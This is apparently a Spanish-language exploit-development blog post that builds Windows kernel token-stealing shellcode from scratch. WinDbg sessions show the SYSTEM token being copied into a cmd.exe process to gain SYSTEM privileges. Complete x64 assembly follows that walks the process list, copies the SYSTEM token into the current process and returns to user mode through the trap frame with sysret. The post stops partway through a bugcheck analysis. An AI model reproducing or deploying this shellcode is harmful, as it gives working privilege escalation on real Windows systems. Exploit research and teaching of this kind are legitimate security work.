<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Token Stealing</title>

  <meta name="description" content="Creación de shellcode para token stealing en modo kernel">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Token Stealing">
  <meta name="twitter:description" content="Creación de shellcode para token stealing en modo kernel">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/token-stealing/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Token Stealing">
  <meta property="og:description" content="Creación de shellcode para token stealing en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/token-stealing/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/token-stealing/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Token Stealing" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="xchg2pwn" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#token">Token</a></li>
        <li><a href="#shellcode">Shellcode</a></li>
        <li><a href="#cleanup">Cleanup</a></li>
        <li><a href="#usage">Usage</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/token-stealing/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Token Stealing</h2><br>
  </header>

<p class="plain-text">Después de explotar una vulnerabilidad en el kernel necesitamos un <code class="language-plaintext highlighter-rouge">shellcode</code> que nos ejecute algo, mas especificamente que nos de privilegios elevados en el equipo, por ello en este post crearemos desde 0 un shellcode para robar el <code class="language-plaintext highlighter-rouge">token</code> de un proceso elevado y copiarlo al proceso actual para obtener asi sus privilegios, a esta técnica se le llama <code class="language-plaintext highlighter-rouge">token stealing</code> y es de las mas usadas en exploits de kernel</p>

<section class="post" id="token">
<br><h3 class="post-title">Token</h3><br>    

<p class="plain-text">En windows existe un proceso llamado <code class="language-plaintext highlighter-rouge">SYSTEM</code> al cual le pertenece el pid <code class="language-plaintext highlighter-rouge">4</code>, este alberga la mayoria de subprocesos del sistema en modo kernel, dado que alberga la ejecución del código en modo kernel este deberia estar en un contexto de privilegios administrativos por lo que podemos usarlo como base para nuestro shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 System
PROCESS ffff8688a5c99080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffb60e7c05bf00  HandleCount: 3042.  
    Image: System</span>
</code></pre></div></div><br>

<p class="plain-text">la dirección que nos otorga el primer resultado es la de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, entre los atributos de la estructura en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> encontramos lo primero interesante para nuestro shellcode, esto es el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS 0xffff8688a5c99080
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : 0x00000000`00000004 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff8688`a5d084c8 - 0xfffff807`04a1e0d0 ]  
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : 0xd000
   ................................
   +0x4b0 ExceptionPortData : (null) 
   +0x4b0 ExceptionPortValue : 0
   +0x4b0 ExceptionPortState : 0y000
   +0x4b8 Token            : _EX_FAST_REF</span>
</code></pre></div></div><br>

<p class="plain-text">El campo <code class="language-plaintext highlighter-rouge">Token</code> se muestra como una estructura <code class="language-plaintext highlighter-rouge">_EX_FAST_REF</code>, esta almacena 3 atributos entre los cuales cambia solo el tipo de dato, ya que el <code class="language-plaintext highlighter-rouge">offset</code> se mantiene</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits  
   +0x000 Value            : Uint8B</span>
</code></pre></div></div><br>

<p class="plain-text">En esta estructura se almacena nuestro token, esto podemos verlo accediendo al valor en el offset 0x4b8 del proceso, luego limpiaremos el valor de RefCnt</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff8688a5c99080 + 0x4b8
   +0x000 Object           : 0xffffb60e`7c036895 Void  
   +0x000 RefCnt           : 0y0101
   +0x000 Value            : 0xffffb60e`7c036895</span>
</code></pre></div></div><br>

<p class="plain-text">El campo <code class="language-plaintext highlighter-rouge">RefCnt</code> es igual a <code class="language-plaintext highlighter-rouge">0y0101</code> que equivale a <code class="language-plaintext highlighter-rouge">5</code> en decimal, usando <code class="language-plaintext highlighter-rouge">and</code> podemos limpiar el ultimo bit, el resultado que obtenemos es <code class="language-plaintext highlighter-rouge">5</code>, lo que nos interesa es el valor opuesto, osea el token con este bit limpio, para usaremos <code class="language-plaintext highlighter-rouge">-</code> en <code class="language-plaintext highlighter-rouge">0xf</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> ? 0y0101
Evaluate expression: 5 = 00000000`00000005

</span><span class="ro">0: kd></span><span class="p"> ? 0xffffb60e7c036895 & 0xf
Evaluate expression: 5 = 00000000`00000005

</span><span class="ro">0:000></span><span class="p"> ? 0xffffb60e7c036895 & -0xf
Evaluate expression: -81301650315119 = ffffb60e`7c036891  </span>
</code></pre></div></div><br>

<p class="plain-text">De esta forma tenemos el <code class="language-plaintext highlighter-rouge">token</code> sin procesar, en este punto podemos copiarlo a otro proceso, y nada mejor que hacerlo a una <code class="language-plaintext highlighter-rouge">cmd.exe</code> para comprobar su funcionamiento</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user> </span><span class="am">whoami</span><span class="p">
windows\user

C:\Users\user></span>
</code></pre></div></div><br>

<p class="plain-text">Después de generar el proceso identificaremos la dirección del proceso, luego de ello podemos sobrescribir el <code class="language-plaintext highlighter-rouge">token</code> por el que conseguimos anteriormente de <code class="language-plaintext highlighter-rouge">SYSTEM</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !process 0 0 cmd.exe
PROCESS ffff8688ad974080
    SessionId: 1  Cid: 1e5c    Peb: c21129d000  ParentCid: 14e0
    DirBase: ac421000  ObjectTable: ffffb60e8166c3c0  HandleCount:  80.
    Image: cmd.exe

</span><span class="ro">0: kd></span><span class="p"> eq 0xffff8688ad974080 + 0x4b8 0xffffb60e7c036891  

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado, al volver a la <code class="language-plaintext highlighter-rouge">cmd.exe</code> y comprobar el usuario y privilegios, ahora es <code class="language-plaintext highlighter-rouge">nt authority\system</code> ya que hemos suplantado todos los privilegios con el token</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Users\user></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shellcode">
<br><h3 class="post-title">Shellcode</h3><br>

<p class="plain-text">El plan es hacer algo similar a lo de antes desde un <code class="language-plaintext highlighter-rouge">shellcode</code> pero en lugar de una <code class="language-plaintext highlighter-rouge">cmd</code> al proceso actual, pero para ello primero necesitamos obtener la dirección del <code class="language-plaintext highlighter-rouge">token</code> en el proceso actual, según documentación la función <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> deberia devolver un puntero al <code class="language-plaintext highlighter-rouge">EPROCESS</code> actual, podemos partir de esa base</p>
<p class="plain-text">La primera instrucción de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> utiliza el segmento <code class="language-plaintext highlighter-rouge">gs</code> con un offset de <code class="language-plaintext highlighter-rouge">0x188</code>, esto es el puntero a la entrada <code class="language-plaintext highlighter-rouge">KTRHEAD</code> en la estructura <code class="language-plaintext highlighter-rouge">ETHREAD</code>, podemos verificar que <code class="language-plaintext highlighter-rouge">KiInitialThread</code> representa la dirección del hilo actual, sin embargo necesitamos la dirección del proceso padre pero es un buen avance</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> u nt!PsGetCurrentProcess L3
nt!PsGetCurrentProcess:
fffff807`04086700 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff807`04086709 488b80b8000000     mov   rax,qword ptr [rax+0B8h]
fffff807`04086710 c3                 ret

</span><span class="ro">0: kd></span><span class="p"> dqs gs:[0x188] L1
002b:00000000`00000188  ffff8688`a5cdf080

</span><span class="ro">0: kd></span><span class="p"> !thread -p
PROCESS ffff8688a5c99080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffb60e7c05bf00  HandleCount: 2965.
    Image: System

THREAD ffff8688a5cdf080  Cid 0004.0070  Teb: 0000000000000000 Win32Thread: 0000000000000000 RUNNING on processor 0  
Not impersonating</span>
</code></pre></div></div><br>

<p class="plain-text">La siguiente instrucción de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> mueve el contenido de la dirección anterior mas un offset de <code class="language-plaintext highlighter-rouge">0xb8</code>, la lógica nos dice que esta será la dirección del proceso actual ya que la siguiente es un <code class="language-plaintext highlighter-rouge">ret</code>, esto podemos comprobarlo desplegando la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> y pasandole como valor lo que creemos es la dirección del proceso actual, esta muestra el PID <code class="language-plaintext highlighter-rouge">4</code> de system por lo que es correcto</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS poi(nt!KiInitialThread + 0xb8)
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : 0x00000000`00000004 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff8688`a5d084c8 - 0xfffff807`04a1e0d0 ]  
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : 0xd000</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos con la escritura del shellcode, las instrucciones de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> nos servirán para obtener la dirección del proceso actual y después lo guardamos en <code class="language-plaintext highlighter-rouge">rbx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS  
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS</span>  
</code></pre></div></div><br>

<p class="plain-text">Un elemento interesante de <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> que es una estructura <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code>, esta es una lista doblemente enlazada que quiere decir que cada elemento apunta al anterior y siguiente elemento, esta lista se encarga del registro de todos los procesos activos por lo que deberiamos encontrar a <code class="language-plaintext highlighter-rouge">SYSTEM</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : Uint4B

</span><span class="ro">0: kd></span><span class="p"> dt nt!_LIST_ENTRY
   +0x000 Flink            : Ptr64 _LIST_ENTRY  
   +0x008 Blink            : Ptr64 _LIST_ENTRY  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos escribir un bucle que se encargue de recorres esta lista y comparar el <code class="language-plaintext highlighter-rouge">PID</code> del proceso con <code class="language-plaintext highlighter-rouge">4</code>, el cual pertenece a <code class="language-plaintext highlighter-rouge">SYSTEM</code> hasta encontrar su dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">       ; $rbx = ActiveProcessLinks  
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448               </span><span class="c1">; $rbx = _EPROCESS
        </span><span class="o">cmp</span><span class="no"> qword </span><span class="p">[</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x440</span><span class="p">]</span><span class="p">,</span><span class="mi"> 0x4</span><span class="c1"> ; cmp PID to SYSTEM PID
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                    ; if zf == 0 -> loop</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez encontramos la estructura del proceso <code class="language-plaintext highlighter-rouge">SYSTEM</code> podemos obtener el <code class="language-plaintext highlighter-rouge">token</code> de este y copiarlo a nuestro proceso actual, no sin antes limpiar el valor <code class="language-plaintext highlighter-rouge">RefCnt</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]           </span><span class="c1">; $rcx = SYSTEM token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0                     </span><span class="c1">; clear _EX_FAST_REF struct
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">           ; store SYSTEM token in _EPROCESS  </span>
</code></pre></div></div><br>

<p class="plain-text">Para finalizar podriamos simplemente establecer el valor de retorno en <code class="language-plaintext highlighter-rouge">0</code> indicando éxito y retornar fuera de la función y continuar su ejecución normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    xor </span><span class="mi">rax</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                     ; $rax = STATUS SUCCESS  
    </span><span class="o">ret</span><span class="c1">                              ; return</span>
</code></pre></div></div><br>

<p class="plain-text">Hasta ahora nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> se ve de esta forma, sin embargo aún tenemos un problema y es la salida de forma correcta donde tenemos varias opciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS  
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS

</span><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">       ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448               </span><span class="c1">; $rbx = _EPROCESS
        </span><span class="o">cmp</span><span class="no"> qword </span><span class="p">[</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x440</span><span class="p">]</span><span class="p">,</span><span class="mi"> 0x4</span><span class="c1"> ; cmp PID to SYSTEM PID
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                    ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]           </span><span class="c1">; $rcx = SYSTEM token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0                     </span><span class="c1">; clear _EX_FAST_REF struct
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">           ; store SYSTEM token in _EPROCESS

    </span><span class="o">xor </span><span class="mi">rax</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                     ; $rax = STATUS SUCCESS
    </span><span class="o">ret</span><span class="c1">                              ; return</span>
</code></pre></div></div><br>

</section>

<section class="post" id="cleanup">
<br><h3 class="post-title">Cleanup</h3><br>

<p class="plain-text">Aunque el shellcode copiará el token a nuestro proceso seguimos en una <code class="language-plaintext highlighter-rouge">ioctl</code> y al explotar la vulnerabilidad modificamos la pila, al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> provocará un <code class="language-plaintext highlighter-rouge">BSOD</code>, la primera opción es restaurar la pila a un punto en donde al retornar no bloquee o buscamos una forma que evite este problema de forma mucho mas general</p>
<p class="plain-text">En lugar complicarnos intentando restaurar la pila podemos simplemente volver al modo de usuario, sin embargo necesitamos restaurar el contexto del estado de la <code class="language-plaintext highlighter-rouge">CPU</code> a como estaba antes de cambiar a modo kernel, para nuesta suerte esto se guarda en el <code class="language-plaintext highlighter-rouge">TrapFrame</code> que es un valor de la estructura <code class="language-plaintext highlighter-rouge">KTRHEAD</code> en el offset <code class="language-plaintext highlighter-rouge">0x90</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs gs:0x188 L1
002b:00000000`00000188  ffffb68c`7dddc080

</span><span class="ro">0: kd></span><span class="p"> dt nt!_KTHREAD 0xffffb68c7dddc080
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x7a1c381
   +0x028 InitialStack     : 0xffff8503`c6614c90 Void
   +0x030 StackLimit       : 0xffff8503`c660f000 Void
   +0x038 StackBase        : 0xffff8503`c6615000 Void
   ..................................................
   +0x080 SystemCallNumber : 7
   +0x084 ReadyTime        : 9
   +0x088 FirstArgument    : 0x00000000`00000094 Void
   +0x090 TrapFrame        : 0xffff8503`c6614b00 _KTRAP_FRAME  </span>
</code></pre></div></div><br>

<p class="plain-text">En esta estructura podemos encontrar los registros guardados de modo usuario, necesitamos restaurar varios de ellos que no se consideran <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160">volátiles</a>, para ello nos guiaremos de la <a href="https://www.felixcloutier.com/x86/sysret">documentación</a> donde nos dice que registros deben contener que valores, por ejemplo que <code class="language-plaintext highlighter-rouge">r11</code> debe contener las <code class="language-plaintext highlighter-rouge">rflags</code> o <code class="language-plaintext highlighter-rouge">rcx</code> el valor de <code class="language-plaintext highlighter-rouge">rip</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_KTRAP_FRAME 0xffff8503c6614b00
   +0x000 P1Home           : 0xffffb68c`7dddc080
   +0x008 P2Home           : 0x10
   +0x010 P3Home           : 0xffff8503`00000000
   +0x018 P4Home           : 0xffffb68c`00000000
   .............................................  
   +0x140 Rbx              : 0
   +0x148 Rdi              : 0x94
   +0x150 Rsi              : 0x000001ae`845b0000
   +0x158 Rbp              : 0x94
   +0x160 ErrorCode        : 4
   +0x160 ExceptionFrame   : 4
   +0x168 Rip              : 0x00007ff8`728ed0c4
   +0x170 SegCs            : 0x33
   +0x172 Fill0            : 0 ''
   +0x173 Logging          : 0 ''
   +0x174 Fill1            : [2] 0
   +0x178 EFlags           : 0x246
   +0x17c Fill2            : 0
   +0x180 Rsp              : 0x00000083`ed55fb98</span>
</code></pre></div></div><br>

<p class="plain-text">Con lo que sabemos ahora podemos simplemente restaurar los registros desde la estructura <code class="language-plaintext highlighter-rouge">TrapFrame</code> a como nos conviene para posteriormente intercambiar el segmento <code class="language-plaintext highlighter-rouge">gs</code> y ejecutar el <code class="language-plaintext highlighter-rouge">sysret</code> para volver al modo de usuario, no sin antes establecer el valor de retorno en <code class="language-plaintext highlighter-rouge">eax</code> a <code class="language-plaintext highlighter-rouge">0</code> indicado que ha vuelto correctamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS  
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS

</span><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">       ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448               </span><span class="c1">; $rbx = _EPROCESS
        </span><span class="o">cmp</span><span class="no"> qword </span><span class="p">[</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x440</span><span class="p">]</span><span class="p">,</span><span class="mi"> 0x4</span><span class="c1"> ; cmp PID to SYSTEM PID
        </span><span class="o">jnz .</span><span class="na">loop</span><span class="c1">                    ; if zf == 0 -> loop

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]           </span><span class="c1">; $rcx = SYSTEM token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0                     </span><span class="c1">; clear _EX_FAST_REF struct
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">           ; store SYSTEM token in _EPROCESS

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x90</span><span class="p">]</span><span class="c1">            ; $rdx = ETHREAD.TrapFrame
    </span><span class="o">mov</span><span class="mi"> rbp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x158</span><span class="p">]</span><span class="c1">           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x168</span><span class="p">]</span><span class="c1">           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="o">mov</span><span class="mi"> r11</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x178</span><span class="p">]</span><span class="c1">           ; $r11 = ETHREAD.TrapFrame.EFlags  
    </span><span class="o">mov</span><span class="mi"> rsp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x180</span><span class="p">]</span><span class="c1">           ; $rsp = ETHREAD.TrapFrame.Rsp

    </span><span class="o">xor</span><span class="mi"> eax</span><span class="p">,</span><span class="mi"> eax</span><span class="c1">                     ; $eax = STATUS SUCCESS
    </span><span class="o">swapgs</span><span class="c1">                           ; swap gs segment
    </span><span class="o">o64 sysret</span><span class="c1">                       ; return to usermode</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al intentar usar este shellcode nos devuelve un BSOD ocasionado por el error <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x1--apc-index-mismatch">APC_INDEX_MISMATCH</a>, la documentación nos dice que esto se debe a que <code class="language-plaintext highlighter-rouge">KeEnterCriticalRegion</code> debe tener una llamada coincidente a <code class="language-plaintext highlighter-rouge">KeLeaveCriticalRegion</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x00000001 (0x00007FFBD644F8B4,0x0000000000000000,0x000000000000FFFF,0xFFFFDB0487C53B80)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff806`34c073f0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

APC_INDEX_MISMATCH (1)
